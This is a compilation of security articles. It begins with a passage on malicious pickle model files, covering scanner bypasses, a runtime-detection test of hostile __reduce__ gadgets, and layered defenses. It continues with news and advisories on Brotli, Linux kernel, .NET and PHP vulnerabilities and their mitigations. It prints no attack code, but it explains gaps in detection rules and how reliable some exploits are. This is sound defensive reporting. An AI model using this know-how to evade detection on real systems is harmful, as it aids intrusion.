In every case, the thing doing the checking and the thing doing the loading disagreed about what the file was. The attacker did not defeat the check, but found a reading of the file on which the check did not apply.

This is structural, not simply a run of bad luck. A checker has to anticipate how every loader, at every version and down every legacy code path, will interpret a stream of bytes. The loader only has to interpret it one way, and that’s what leads to missed malicious files.

A pickle doesn’t need to be valid to work

The nullifAI models were broken on purpose.

Recall from the first section that the pickle VM executes opcodes as it encounters them. There is no validation pass. The payload was placed at the head of the stream, so by the time deserialization reached the corruption and threw an error, os.system had already been called. As ReversingLabs described it, opcodes execute "until all opcodes are executed or a broken instruction is encountered."

A scanner that parses the whole file and reports a parse error has reported nothing useful. The victim is already compromised. Data is parsed and then used, so a corrupted file yields nothing. A program runs until it faults, and everything before the fault has already happened. Treating a model file as data isn’t just a stylistic error.

Look back at the table in the “Which models are actually vulnerable” section. The formats in the bottom rows are not safe because they are well patched, but because there is nothing in a safetensors file that can express a call — no opcode, callable, or reconstruction procedure. The security property is a consequence of what the format cannot say, which is why it does not need a version number to be trusted.

That is the whole argument for conversion. But conversion is not always available, and plenty of production systems load pickles today. So the next question is what you can see when one of them runs.

Detection

There are two places to catch a malicious model: before it loads, and while it runs. They fail in different directions, and the difference matters.

Scanning at rest

Scanning is the primary control. It is cheap, it runs in CI, it blocks the artifact before anything executes, and against a textbook payload it works. A __reduce__ gadget calling os.system is exactly what modelscan and picklescan are built to find.

The CVEs listed in the third section are the reason that is not reassuring. Every bypass in that list defeated a scanner that was working correctly on the file it believed it was reading. This includes extension checks, ZIP parsing, flag bits, 7z, and a deliberately corrupted stream. None of them broke the detection logic, but they did change what the file was on the way in.

A scanner that catches the obvious case has only told you the obvious case is caught. It cannot tell you the file is safe, because "safe" would require it to have anticipated how every loader, at every version, down every legacy path, will read those bytes: a huge amount of combinations to reason through and one that make scanning alone unfeasible. That is the asymmetry.

So the honest question is not whether to scan, but what’s left standing when the scan is bypassed.

Watching it run

Runtime detection is the layer that gets proposed as the logical answer, so let’s measure it.

We built five hostile gadget families, each one a pickle whose __reduce__ performs a different post-exploitation action, and ran them against two engines: open source Falco 0.44.1 on its default ruleset and Sysdig Secure.

Both runs fired a positive control first. All five outcomes were predicted in writing before the run.

All five gadget families triggered Sysdig Secure rules, all within two seconds. Four of five triggered OSS Falco defaults. Falco’s open source default ruleset contains 26 rules versus the commercial product’s 278. This includes the Falco rule Modify Python Startup Hook File, which was created after this test.

Three findings in that table matter more than the raw score, however.

First, the spawn axis is irrelevant. We expected the gadget that forks a shell to look different from the one that never leaves the Python process, but the detections don’t differ. The shell-spawned gadget was caught in 1.6 seconds, the direct one in 1.9 seconds, and the entirely in-process one in 1.5 seconds The same rule caught all three. Whether a gadget forks is a fact about its syscall surface, not about whether it’s visible.

Second, runtime itself doesn’t solve the checker vs. loader problem, but it doesn’t need to. A runtime sensor never observes the deserialization at all, but the consequences. Nothing in that table detected a pickle being loaded. What fired was a file read, or an outbound connection, that happened to originate downstream of one.

That sounds like a technicality until you read the rules that look like they should have caught this. Shell Spawned with Inline Python Command keys on proc.pcmdline containing -c together with the literal source text; import os and os.system. Base64-encoded Python Script Execution does the same thing one encoding layer down. Both assume malicious Python is visible on the command line.

And third, a pickle load is python3 load_pickle.py model.pkl. The gadget is in the file. None of that text is ever on the command line, at any encoding layer, ever.

Best practices if you must deploy a susceptible model

As we’ve established, no single layer is foolproof on its own. But that’s not an argument for doing nothing. It’s a case for ordering the layers by how they fail.

The stack below is ordered by strength, each a part of a stronger approach to defense:

1. Convert the format, and stop having the problem.

Most models don’t need to serialize anything but named arrays of numbers. If that is true of yours, store it in a container that cannot express a call: safetensors for weights, GGUF for quantized inference, and ONNX where you need a compute graph.

The difference between those three matters more than it may seem. Safetensors is structurally safe , as it consists of tensors and a JSON header, with nothing in the format capable of expressing a callable. GGUF and ONNX have no known path, which is more of a claim about the current state of research than about the format's expressive limits. ONNX in particular carries a full operator graph and a history of parser CVEs. When deploying a new model, opt for the format that is safe because of what it can’t say.

Caveat: "No known path" isn’t "proven safe," as conversion isn’t always available. A model distributed only as a pickle has to be loaded once to be converted. Do that in the sandbox from step 5 below, not on a build host.

2. Pin your loaders past the bypasses, and verify the version actually running.

For PyTorch, the most secure approach means version 2.10.0 or later. The weights_only=True default arrived in 2.6 and was widely reported as the fix, but CVE-2026-24747 defeats the restricted unpickler itself and affects every version before 2.10.0. A team that pinned 2.6 in early 2025 on security advice stayed exposed for four further minor versions.

For Keras, run current and refuse legacy .h5 inputs rather than trusting safe_mode on that path. CVE-2025-9905 is the case where it is ignored with no warning. For NumPy, keep allow_pickle=False and treat any code that flips it as a finding.

Caveat: This layer has arguably the worst track record of anything on this list. Every entry above is a fix that was itself later bypassed. Pin it, but do not spend the trust it appears to buy.

3. Scan at rest, in CI, as a gate.

Run modelscan or picklescan on ingest and fail the build rather than the deployment. It’s cheap and it catches the commodity case, which is most of what you will actually encounter.

Caveat: Scanners are blocklist-based, and every CVE evaluated beat a scanner that was working correctly. A clean scan is the only absence of evidence. Never let it be the signal that promotes an artifact to production.

4. Establish provenance.

Track which model came from where. Sign what you build, verify what you consume, and give preference to publishers who do the same.

Caveat: A signature proves origin, not intent. The malicious models found on Hugging Face were authentically uploaded by the accounts that uploaded them. Provenance narrows who you have to trust, but it doesn’t tell you whether that trust is deserved.

5. Load inside a sandbox with an egress boundary.

This is the least glamorous control on this list, but the most reliably effective. Load models in a process with no credentials worth stealing, no write access to anything that persists, and an explicit egress allowlist.

This is the only control here that doesn’t depend on recognizing the attack; it doesn’t have to. It isn’t deciding whether the connection is malicious, only whether it’s permitted.

Caveat: A sandbox bounds the blast radius, but doesn’t prevent execution. The code still runs. You are choosing what it can reach.

6. Always assume breach, and use runtime detection as the backstop.

Everything above is a prediction about a file. Runtime is the only layer that observes what actually happened. Use runtime observability to verify what your code is actually doing and catch malicious activity.

Caveat: In this case, it’s silent on behavior that looks innocuous, and it never sees the load itself, only consequences.

Why that order matters

Read through the first four controls again, and there’s one distinct pattern: Each works by predicting how a file will be interpreted. The converter predicts the format. The pinned loader predicts which code path will run. The scanner predicts what the loader will do with those bytes. The signature predicts that a known publisher produced what they meant to produce.

Every bypass is an attacker finding an interpreter that disagreed with one of those predictions. And there is no reason to expect it to stop, because the asymmetry producing it never closes. A checker has to anticipate every loader. A loader only has to interpret the file one way, and it is the one that actually runs.

The sandbox and the runtime sensor are the two controls on this list that don’t predict. The sandbox doesn’t care what the file is. It constrains what the code can reach once it’s already running. The sensor doesn’t care either. It reports what the process did.

But that doesn’t make them sufficient alone. Runtime never observes the deserialization, the rules that look like they should catch malicious Python assume the malice is visible on the command line, and the correlation layer that ought to be the sophisticated tier never fired once.

Ultimately, the most comprehensive approach is a “both and” strategy. A scanner and a loader that disagree produce a bypass. A scanner and a sensor that disagree produce an alert.

A model file is a program. It shouldn’t move through a pipeline built for data, and you must assume that whatever you use to check the model file has a reading of those bytes that the thing loading them doesn’t share.

Full Text:
Researchers have demonstrated remote code execution through CVE-2026-111497, an out-of-bounds write in Google's Brotli decoder library, and public proofs-of-concept (PoCs) are available. Software that uses the decoder includes Node.js, .NET, Bun, Envoy Proxy, Istio, Python HTTP clients and PHP for Windows.

Update October 27: CISA added CVE-2026-111497 to its KEV catalog.

October 26: Original publication.

Key Takeaways

CVE-2026-111497, known as Brotli2Shell and by several other names, is an out-of-bounds write in Google's Brotli decoder library that Google, the CVE Numbering Authority (CNA), scored 9.2 under CVSSv4.0.

Any application that decompresses attacker-controlled data with a vulnerable Brotli decoder is potentially at risk, including Node.js, .NET, Bun, Envoy Proxy, Istio, Python HTTP clients, FFmpeg, Apache Arrow and ClickHouse.

Patches are available for Google Brotli and the major runtimes, though some projects had not shipped a fixed release as of October 26, and applications that bundle their own copy of Brotli each need their own fix.

Background

Tenable's Research Special Operations (RSO) team has compiled this blog to answer Frequently Asked Questions (FAQ) regarding Brotli2Shell, a vulnerability in Google's Brotli C decoder library, which Node.js, .NET and other software embed.

FAQ

What is Brotli2Shell?

Brotli2Shell is one of several names for CVE-2026-111497, a memory corruption flaw in Google's open-source Brotli compression library. Some researchers call it Node2Shell, after Node.js, which disclosed the flaw in its October 21 security advisory. Others use HTTP2Shell, since the same bug reaches HTTP software outside Node.js. It has circulated as Broccoli2Shell as well. We use Brotli2Shell because the bug sits in the Brotli decoder itself, not in any one downstream product.

What is the vulnerability associated with Brotli2Shell?

CVE-2026-111497 is an out-of-bounds write vulnerability in the Google Brotli C decoder library.

CVE

Description

CVSSv4.0

CVE-2026-111497

Google Brotli decoder out-of-bounds write vulnerability

9.2

An attacker can trigger the flaw by getting an application to decompress crafted Brotli data. Two common paths are a compressed HTTP response sent to a client that decompresses it automatically, and a compressed request body sent to a server that decompresses incoming content. The impact ranges from a process crash to potential remote code execution, and the bug can also leak process memory.

Note on severity scoring: Google, as the CNA, scored the flaw 9.2 (CVSSv4.0) with vector CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N. Microsoft rates it 8.1 (CVSSv3.1) for .NET.

When was CVE-2026-111497 first disclosed?

Google committed the upstream fix to the Brotli source repository on February 27. Node.js publicly disclosed the vulnerability on October 21 in its security advisory, the same day Google released fixed Brotli versions. Envoy Proxy and Istio had already shipped fixed releases earlier in October without naming the flaw. NVD published the CVE record on October 22. Brotli 1.2.1 and brotlicffi 1.2.1.0 both reached the Python Package Index (PyPI) on October 22. On October 25, Microsoft released .NET security updates.

What software is affected by CVE-2026-111497?

The risk applies wherever an application decompresses Brotli data an attacker can control, whether that data arrives over HTTP in either direction or inside a file.

Node.js release lines that have reached end of support, including 20, 23 and 25, do not receive a fixed release. Akamai said its telemetry "shows that 61% of networks are running affected Node.js versions."

JFrog Security Research showed that the flaw also reaches FFmpeg through the libjxl library, by way of Brotli-compressed metadata in JPEG XL files. JFrog obtained instruction-pointer control in FFmpeg with a crafted JPEG XL file but did not demonstrate code execution. The same research produced an infinite-loop denial of service in Apache Arrow, which uses Brotli for compressed Parquet data, with a crafted 534-byte input, and crashed a tested ClickHouse server with a single malformed Brotli-compressed HTTP request. Python HTTP clients such as urllib3, requests, httpx and aiohttp are also in scope when the Brotli or brotlicffi package is installed.

Does updating the system Brotli library fix the issue?

It depends on where the software gets its decoder. Programs that load the operating system's copy of Brotli pick up the fix once they restart. Node.js, Bun and other applications that ship with a built-in copy keep the flawed decoder until a fixed release of that application is installed.

Is every .NET, Envoy Proxy or Istio installation exposed?

No. These platforms are exposed only when Brotli decompression is in use.

.NET: Microsoft says an application "is not exposed merely because an affected .NET package is installed," and ASP.NET Core request decompression and HttpClient automatic response decompression are off by default. Applications are in scope when they use ASP.NET Core request decompression, HttpClient response decompression, or the Brotli APIs in System.IO.Compression such as BrotliStream and BrotliDecoder. NativeAOT and self-contained applications pick up the fix only when they are rebuilt and redeployed. Microsoft says .NET Framework is not affected.

Envoy Proxy and Istio: Envoy Proxy is exposed only when its Brotli decompressor is configured, and Istio users are potentially affected when they enable Brotli decompression, for example through an EnvoyFilter. Istio 1.29 reached end of support on October 15. Its 1.29.9 release includes the fix.

Is PHP affected by CVE-2026-111497?

PHP's official Windows builds are affected, because they include their own copy of Brotli. On October 26, PHP released updated Windows builds that bundle Brotli 1.2.1. PHP names its cURL extension as the route to the flaw in those builds, once automatic decompression of HTTP responses is enabled. cURL keeps that setting off unless an application or HTTP client library enables it. On other platforms, PHP can still reach a vulnerable decoder through the system Brotli library or through the PHP brotli extension, which bundles its own copy and fixed the flaw in version 0.21.1. The PHP source releases are unchanged, and this flaw is separate from the PHP2Shell vulnerabilities covered in our FAQ.

Is CVE-2026-111497 being exploited in the wild?

On October 26, threat intelligence firm ELLIO reported that its sensors recorded an exploitation attempt against CVE-2026-111497. ELLIO said the attempt targeted Node.js 24.22.0 on x86-64 and combined code copied from public PoCs with an original exploit chain. Tenable has not independently confirmed this activity. On October 27, CISA added CVE-2026-111497 to its Known Exploited Vulnerabilities (KEV) catalog, with a remediation due date of November 10 for Federal Civilian Executive Branch (FCEB) agencies.

Has Tenable Research classified this vulnerability as part of Vulnerability Watch?

Yes. CVE-2026-111497 has been classified as a “Vulnerability of Interest” as part of Vulnerability Watch.

Is there a proof-of-concept (PoC) available for CVE-2026-111497?

Yes. Public PoCs for CVE-2026-111497 are available on GitHub. The Imperva Red Team demonstrated code execution against the official Node.js 24.22.0 Linux arm64 image after multiple attempts, and has not released that exploit. At least one public PoC on GitHub claims code execution against Node.js 24.22.0 under narrow lab conditions. ELLIO said it reproduced code execution against the official Node.js 24.22.0 build on x86-64.

How reliable is exploitation of CVE-2026-111497?

According to ELLIO, an exploit has to be tuned to the specific Node.js build it targets. ELLIO reported that an exploit tuned for the official Node.js 24.22.0 build on x86-64 produced nothing in 10,000 attempts against Node.js 22.23.3 and 26.12.0, which each need their own memory offsets. Even against the matching build, most of ELLIO's 400 lab attempts against an Express server crashed the worker process instead of returning a shell, but where workers restart automatically, an attacker gets repeated tries. The exploit request ELLIO captured in the wild did not produce a shell in 50 lab attempts against a vulnerable Node.js 24.22.0 target. Imperva also needed multiple attempts to achieve code execution against Node.js 24.22.0 on Linux arm64.

Are patches or mitigations available for CVE-2026-111497?

Fixed versions for Google Brotli, Node.js, Bun, Envoy Proxy, Istio, .NET, the Python Brotli packages and PHP for Windows are listed in the table above. As of October 26, ClickHouse had merged a fix without shipping a release, and the Apache Arrow issue remained open.

Patching does not reach code that is already running. The fixed decoder takes effect in a process or scheduled job only after a restart, and in a container only after its image is rebuilt and redeployed.

Where patching is delayed, the Patch the Planet mitigation guide and the broccoli2shell.com tracker list temporary steps that reduce exposure:

Blocking requests marked Content-Encoding: br at the proxy or load balancer, so they stop before anything decompresses them. This step does nothing for applications that fetch Brotli responses from attacker-controlled servers, and turning off Brotli compression on an origin server or CDN has no effect on decompression.

Turning off Brotli decoding in HTTP clients. Taking br out of the Accept-Encoding header falls short by itself, since a hostile server can still reply with Brotli-encoded data.

Disabling the Brotli decompressor filter in Envoy Proxy and Istio in both directions. A disabled filter forwards compressed bytes as they arrive, which leaves any downstream service that decodes Brotli at risk.

Removing the Brotli or brotlicffi package from Python environments until a patched version is in place.

Are there any indicators of compromise for CVE-2026-111497?

ELLIO published the source IP address and a payload hash for the exploitation attempt it observed. They are available in ELLIO's blog post.

Has Tenable released product coverage for CVE-2026-111497?

A list of Tenable plugins for this vulnerability can be found on the individual CVE page for CVE-2026-111497 as they're released. This link will display all available plugins for this vulnerability, including upcoming plugins in our Plugins Pipeline.

Tenable Network Monitor leverages third-party software to help provide underlying functionality. Several of the third-party components (OpenSSL, curl, expat, libxml2) were found to contain vulnerabilities, and updated versions have been made available by the providers.

Out of caution and in line with best practice, Tenable has opted to upgrade these components to address the potential impact of the issues. Tenable Network Monitor 6.6.0 updates OpenSSL to version 3.5.9, curl to version 8.21.0, expat to version 2.9.0 and libxml2 to version 2.15.4 to address the identified vulnerabilities.

Title: Linux Flaws Exposed Before Fixes as Root Exploit Goes Public
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
A working exploit for a Linux kernel flaw has been made public before the bug received a CVE identifier or a merged upstream fix.

Trend Micro's Zero Day Initiative (ZDI) sent that report and five others to maintainers and public mailing lists on October 20 and 21, according to analysis published by the Sysdig Threat Research Team on October 24.

No in-the-wild exploitation had been reported when Sysdig published its analysis, but several flaws still had no fix in any released kernel.

Public Disclosure Creates Patch Gap

ZDI-CAN-33367, the flaw with the public exploit, is a local privilege escalation (LPE) bug in the Linux networking stack that ZDI gave a CVSS score of 7.8. It can allow an unprivileged user to alter the in-memory contents of files they can only read.

It sits in a code path the kernel's fix for the earlier Dirty Frag page-cache flaws missed. Linux support provider TuxCare reproduced a root shell with the public proof of concept (PoC) on AlmaLinux 8 through 10, CloudLinux 9 and 10, Debian 12 and 13 and Ubuntu 24.04 and 26.04, Sysdig said.

Two of the other five, ZDI-CAN-33774 and ZDI-CAN-33549, are the highest rated, at 9.0, and affect ksmbd, the kernel's Server Message Block (SMB) server. The first is a remote, pre-authentication flaw that can leak kernel memory and crash systems, while the second requires SMB Direct, a Remote Direct Memory Access (RDMA) interface and a writable share.

Read more: Rushed Patches Follow Broken Embargo on New Linux Kernel Vulnerabilities

Exposure Varies Across Linux Systems

Of the remaining three, ZDI-CAN-34068 is an LPE rated 8.8 in the kernel's VMware graphics driver. Sysdig said there was no patch and only the report's title was public.

The last two are ZDI-CAN-34076, an information leak in the kernel's Non-Volatile Memory Express (NVMe) target, and ZDI-CAN-32005, a userspace stack overflow in the ConnMan network manager.

Sysdig said defenders should prioritize by the components they run rather than CVSS scores. It advised unloading ksmbd where it is not needed, restricting port 445 to trusted networks where it must stay and watching for a vmwgfx patch on VMware guests.

For ZDI-CAN-33367, Sysdig said restricting unprivileged user namespaces should block the public PoC, though TuxCare had not validated this, and noted that rootless containers depend on them. AlmaLinux had patched kernels in testing, but not production, by October 23.

The disclosure leaves a fragmented patching picture, but the public root exploit makes ZDI-CAN-33367 the most immediate concern of the six.

Title: Microsoft Issues Emergency Patch Update for Critical .NET Buffer Overflow Flaw
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
Microsoft has released out-of-bound (OOB) security updates for its .NET developer platform, which includes a fix for a critical buffer overflow vulnerability.

The tech giant published the updates for .NET versions 8, 9, 10, and 11 Release Candidate 3 on October 25. Platform users have been urged to apply the updates as soon as possible to reduce the risk of compromise.

They contain patches for two newly disclosed vulnerabilities, as well as two flaws that were not fully addressed in Microsoft’s October Patch Tuesday rollout.

Single updates are available for each of the affected .NET versions and .NET 11 RC2 users should update to RC3 to receive these fixes.

.NET is a free, open-source framework that developers can use to build apps and cloud services. It is managed by Microsoft and is supported on Windows, Linux and macOS operating systems.

Updates Address Critical Buffer Overflow Vulnerability

One of the new vulnerabilities addressed is CVE-2026-111497, which affects .NET versions 8, 9, 10, and 11 across all operating systems.

The vulnerability is contained in the Brotli decompression algorithm, which is used by .NET. It can allow an unauthenticated attacker to read or corrupt process memory, leading to information disclosure, denial of service or elevation of privilege.

Microsoft said that applications may be affected if they process Brotli-compressed data through ASP.NET Core request decompression, HttpClient automatic response decompression or the System.IO.Compression Brotli APIs.

The flaw has a critical CVSS Score of 9.2. Users of Google Brotli versions 1.0.3 through 1.2.0 also need to update any Brotli libraries or binaries to the latest available version.

Brotli was designed by two engineers at Google in 2015 to allow developers to speed up algorithm compression for developers.

Microsoft’s OOB update also addresses CVE-2026-114148, which can allow an authorized attacker to elevate privileges locally by exploiting unsafe ownership metadata in affected .NET tarballs.

CVE-2026-114148 affects .NET versions 7-11, but only for Linux systems. For .NET 10 and .NET 11, CVE-2026-114148 affects source-build tarballs only. For .NET 8 and .NET 9, it also affects ASP.NET Core distributions obtained through ASP.NET Core tarballs, including users who do not build .NET from source, the advisory noted.

It has not been assigned a CVSS score at the time of writing but has been reserved by a CVE Numbering Authority (CNA).

In addition, Microsoft has re-issued fixes for two vulnerabilities disclosed in its October 13 Patch Tuesday rollout. These are for CVE-2026-70197, a memory corruption flaw affecting .NET versions 8-11, and CVE-2026-102870, a code injection vulnerability affecting .NET 10 and 11.

Remediation Guidance for Developers

Microsoft issued advice for .NET users on how to update their applications and build environments in light of the updates. These include:

Install the updated runtime for the .NET version for your framework-dependent application, then restart the application

Rebuild and republish self-contained applications with the updated runtime

Rebuild and redeploy containers using updated .NET container images

Obtain the updated source-build artifacts for your .NET version and rebuild your packages to incorporate the tarball ownership fix

For ASP.NET Core tarball users on .NET 8 and 9, update your installation using the refreshed ASP.NET Core Runtime tarball for your .NET version

Title: Blue Initiative Offers Maritime Sector Dedicated Vulnerability Database

An industry coalition has launched a new database for CVEs it says will help shipping companies to improve their vulnerability management efforts.

Blue Initiative was announced on October 26 by maritime cybersecurity vendors Cydome and Rakuten Maritime, alongside inspection and certification specialist Bureau Veritas, ship classification society ClassNK and the Maritime Transportation System Information Sharing and Analysis Center (MTS-ISAC).

They claimed the new database would be the first to list only IT and OT vulnerabilities relevant to the sector.

It will therefore help maritime companies address vulnerability management and alerting more proactively, it added.

Read more on maritime sector threats: Adriatic Port Cyber-Attack by Anubis Sparks Warning Over Maritime Security Risks

Cydome CEO Nir Ayalon said that identifying flaws relevant to the specialized systems maritime operators use is a challenge.

“Our vision with the Blue Initiative is to have a public and open single source of truth for maritime-related vulnerabilities,” he added. “This will provide IT and cyber teams, vendors and research facilities a much more focused view of risks relevant to their specific vessels, making vulnerabilities and risk management much more effective and faster than before.”

Any proposed entries to the Maritime Vulnerabilities Repository (MVR) will be reviewed by researchers from Cydome and other Blue Initiative partners, who will validate and refine them before publishing.

Users will then be able to:

Browse all CVEs and their details

Filter by relevant equipment or vendors

Access more detailed expert insight on specific vulnerabilities and their impact

Subscribe for updates and alerts on new vulnerabilities

Vulnerabilities are only published once a patch is available, the group clarified.

“Amid a shifting threat landscape where technological advancement increasingly empowers threat actors targeting maritime critical infrastructure, the Blue Initiative delivers essential vulnerability intelligence that addresses a critical vulnerability gap,” argued Christy Coffey, VP operations at MTS-ISAC.

“Recognizing the value of this community-driven approach to maritime situational awareness, the MTS-ISAC strongly endorses this collaborative model and has integrated its operational workflows to both contribute to and leverage this vital initiative.”

Cyber-Attacks on Shipping Mount

The launch comes as attacks in the sector continue. On August 21 and 24, the US Coast Guard and FBI were forced to board two oil tankers in the Gulf of Mexico after cyber-attacks against on-board systems by “foreign cyber actors.”

It’s claimed the hackers were able to breach both IT and OT networks, interfering with propulsion, navigation and other systems.

More recently still, the n0n extortion group added dozens of global maritime organizations to its leak site on October 12. However, none of the claimed victims – which include carriers and port and terminal operators – have thus far confirmed any security incidents.

“Cyber resilience requirements for ships are not simply a checklist for audits, but a continuous process throughout a vessel’s operational life,” explained Panagiotis Anastasiou, cyber technical & market leader, Bureau Veritas Marine & Offshore.

“Owners are expected to maintain the security of onboard systems as new vulnerabilities emerge, making effective vulnerability management a critical element of maritime cyber resilience. In practice, this can be challenging, as relevant information is often scattered across general-purpose databases and vendor advisories.”

Title: PHP Publishes Mitigation Advice for New RCE Flaw
Context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
Full Text:
The maintainers of the popular PHP programming language have warned of a new remote code execution (RCE) vulnerability, but claimed it’s likely to affect a relatively small share of the userbase.

In an advisory published on October 23, the PHP security team said that CVE-2026-115560 would not be patched until the next release, as the conditions needed to exploit it will not be present in most environments.

“The issue can only occur under an unusual combination of configuration and application code. An application must set session.serialize_handler to php_binary or php_serialize in its configuration and then switch it to php at runtime with ini_set() before calling session_start(),” it explained.

“Session upload progress must also still be enabled. Applications that never change the serialize handler at runtime can keep the feature enabled.”

Read more on PHP: PHP2Shell Exploitation Attempt Detected by Amazon Four Days Before Vulnerability Disclosure

System administrators are urged to put in place the mitigation recommended on October 21 in PHP’s advisory for CVE-2026-109619, one of two critical flaws issued last week.

“We suggest you set session.upload_progress.enabled=0 until the next regular bugfix release, to fully protect from an unlikely RCE vector,” it said.

“If you applied it [last week], keep it in place and no further action is needed.”

More Work for Security Teams

Last week saw widespread website outages as administrators scrambled to patch the maximum severity zero days (CVE-2026-109618 and CVE-2026-109619), collectively known as “P2PShell.”

Mike Lyborg, CISO at Swimlane, argued that new flaw needs a “precise response” after days of disruption in many organizations because of PHP2Shell.

“Keeping services running through successive warnings takes coordination that holds up after everyone’s exhausted,” he added. “Across organizations responding to PHP last week, the next bottleneck could be a handoff between the people assessing risk and those authorized to change a live service.”

Their efforts were given an added urgency after details of the vulnerabilities were accidentally disclosed a day before the patches were due to be released.

Amazon Web Services subsequently revealed that an unknown threat actor tried to exploit the bugs four days before they were officially published. It remains unclear how they managed to get hold of the information needed to attempt such an attack.

PHP is used in around 70% of global websites, including content management systems (CMS) like WordPress, Drupal, Joomla and Magento, making the patching of PHP2Shell a major global endeavor.

Title: PHP Patches Two Critical Unauthenticated RCEs (CVE-2026-109618, CVE-2026-109619): [Updated for CVE-2026-115560]
Context: In a world of LLMs and agents, everybody is still running servers - and the model that found these is the same kind of model attackers now have, which is the premise behind Evo...
Full Text:
On Wednesday, October 21, 2026 at 14:00 UTC, the PHP project released PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35 to fix two critical vulnerabilities, both rated CVSS v4.0 9.2, that can allow unauthenticated remote code execution. The PHP security team advises: "There are no complete mitigations; updating is the only safe choice."

These are bugs in the PHP runtime, not in a Composer package. That changes how you detect and fix them, as we explain below

TL;DR If you run PHP that serves web requests (PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, LiteSpeed), update to 8.5.12, 8.4.27, 8.3.36, or 8.2.35 today. If you are on 8.1 or older, get a backported package from your distribution or LTS vendor, or upgrade.

What happened

Times are in UTC.

October 20: The PHP security team published an advance notice of a critical security release scheduled for October 21 at 14:00 UTC. It fixes two vulnerabilities assessed as CVSS v4.0 9.2, with the right reserved to release early if details leak or exploitation is seen in the wild.

October 21, before 14:00 UTC: Snyk published advisories for both CVEs, SNYK-UNMANAGED-PHP-21347795 (CVE-2026-109618) and SNYK-UNMANAGED-PHP-21347796 (CVE-2026-109619), to alert customers to the action they will need to take and so that monitored projects get a hit the moment the fixed versions are known.

October 21, 14:00 UTC: The PHP security advisory and the four fixed releases go live. Within about 30 minutes, Snyk's advisories are updated with all relevant details, including affected ranges and fixed versions.

October 21 onward: Linux distributions (which received the patches in advance) start publishing their own advisories. Snyk publishes advisories for them as they appear, for example SNYK-UBUNTU2604-PHP85-21373920. The running list is at CVE-2026-109618 and CVE-2026-109619.

Update @ October 23: keep session.upload_progress.enabled=0

On October 23, the PHP project published an informational advisory for CVE-2026-115560, a CVE that is reserved but not yet assigned. It describes a partial bypass vector for CVE-2026-109619. The setting that prevents it, session.upload_progress.enabled=0, was already listed as a mitigation for CVE-2026-109619.

PHP is not rushing an emergency fix because the preconditions for exploitation are rare and unlikely to apply to most deployments. An application must configure session.serialize_handler as php_binary or php_serialize, then switch it to php at runtime with ini_set() before calling session_start(), while session upload progress is enabled. Applications that never change the serialization handler at runtime can keep the feature on.

The vulnerabilities

Both are in the request lifecycle of the PHP engine, making them reachable before any application code runs. This is one factor that makes these vulnerabilities both widespread and dangerous.

Technical details

CVE-2026-109618, RCE via out-of-memory corruption: Out-of-memory handling can interrupt PHP while internal request data is only partially initialized. Request cleanup, then treats the invalid data as valid. An attacker who can drive a worker to its memory limit with a malicious request can trigger the interrupt.

CVE-2026-109619, RCE via stale global state: Request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialization resets it. In a long-lived worker model that comprises a cross-request use-after-free.

These bugs were found with AI assistance, in a runtime that has been in production for three decades. In a world of LLMs and agents, everybody is still running servers - and the model that found these is the same kind of model attackers now have, which is the premise behind Evo by Snyk: AI-driven security for the applications that agents run on, not only for the agents themselves. AI-assisted discovery is also why PHP2Shell won’t be the last flaw of its kind, and why response timelines are now measured in hours.

Who is affected

All PHP installations serving web requests are at risk. That covers PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, LiteSpeed, etc. Apache with mod_php is most vulnerable, with a demonstrated exploit in which a single unauthenticated request triggers the attack before application code runs.

PHP 8.1 and older no longer receive updates from the PHP project, so an unpatched 8.1, 8.0, or 7.4 install is affected with no upstream fix. Given the severity, the PHP security team did publish minimal source backports for 7.4, 8.0, and 8.1 for people who build from source or have no LTS vendor.

What you should do now

Update. Fixed versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. Note that 8.2 reaches end of life on December 31, 2026, so if you are on 8.2, this is also your cue to plan the next bump.

Check your vendor. Linux distributions and LTS vendors received the patches ahead of release. Pull their updated packages rather than waiting for a source build. A patched distro build can keep an older version number, so check the distro’s advisory or patch level too.

Verify what’s actually running. Check the PHP version on each host and image (php -v or the image tag). Scan results alone can’t confirm that an installation is fixed.

If you cannot update today, PHP lists mitigations that reduce exposure to specific paths without making an install safe: memory_limit=-1 set where applications cannot override it, a low post_max_size, session.upload_progress.enabled=0 followed by a restart of every worker, and on 8.5 fatal_error_backtraces=0. See the relevant advisory for the caveats on each.

Whether or not you have updated, keep session.upload_progress.enabled=0 set until the next regular bugfix release if your application switches session.serialize_handler at runtime. See the update above for details.

On PHP 8.1 or older, upgrade to a supported version or get a backported package from your distribution or LTS vendor. PHP’s source backports for 7.4, 8.0, and 8.1 are a last resort for teams building from source.

The open source side

The PHP security team gave the ecosystem a day's notice with a fixed time, a severity, and no exploitation details. They pre-shared patches with Linux distributions so packaged fixes could be released alongside the source release. They published backports for unsupported versions (7.4, 8.0, 8.1). They told users of a popular volunteer repo (rpms.remirepo.net) that it would not be updated on day one and what to do instead. And their mitigation guidance is very transparent about what each setting does not protect against.

That is what coordinated disclosure looks like when a volunteer-run project does it right. It is also why, at Snyk, we were able to have advisories live before the release and complete shortly after it: a published schedule lets everyone downstream prepare.

Snyk SCA Behavior

Snyk Open Source reads what your application declares in manifest or build files, like composer.json, composer.lock. The PHP interpreter is not a declared dependency. It is installed by a Dockerfile, a distribution package, a platform image, or by hand. A "php": ">=8.2" constraint in composer.json tells you what the application accepts, but not precisely what is deployed.

How the Snyk Platform helps you find exposed PHP

What you use

What you will see for CVE-2026-109618 and CVE-2026-109619

Snyk Open Source (CLI or SCM integration)

The CVEs themselves are not reported because the PHP runtime is not a regular dependency in your manifest file. For PHP/Composer projects, Snyk shows the application's declared dependencies, which can help you identify which of your projects are PHP applications. The declared PHP version constraint does not tell you which version is deployed.

Snyk C/C++ Unmanaged scanning

